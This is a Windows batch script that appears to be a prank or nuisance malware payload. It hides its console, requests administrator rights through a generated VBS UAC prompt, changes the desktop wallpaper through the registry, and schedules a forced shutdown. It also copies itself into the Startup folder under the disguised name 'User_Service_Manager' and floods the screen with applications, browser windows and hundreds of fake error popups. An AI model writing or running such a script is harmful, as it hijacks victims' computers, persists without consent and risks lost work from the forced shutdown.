call getCmdPid
call windowMode -pid %errorlevel% -mode hidden

:: BatchGotAdmin
:-------------------------------------

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    

SET mypath=%~dp0
cd /D %mypath:~0,-1%

call getCmdPid
call windowMode -pid %errorlevel% -mode hidden

start volume_up_run.vbs

start speak.vbs

timeout 12 /nobreak

reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "%userprofile%\Desktop\payload\soviet_union.jpg" /f 
reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f
reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 

start keyboard_lights.vbs
Shutdown.exe -s -c "Your PC will shut down once the song ends!" -t 275


set "file=backround_track.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
start /min sound.vbs

mklink "%userprofile%\Start Menu\Programs\Startup\User_Service_Manager" "%~f0"

set loop=0
:firstloop

start hacker_man.bat
start soviet_union.jpg
start calc.exe
start mspaint.exe
start notepad.exe
start http://www.themostamazingwebsiteontheinternet.com/

set /a loop=%loop%+1 
if "%loop%"=="5" goto next
goto firstloop

:next

set loop=0
:loop

start fake_error.vbs
start fake_error.vbs
start fake_error.vbs


set /a loop=%loop%+1 
if "%loop%"=="100" goto next
goto loop

:next

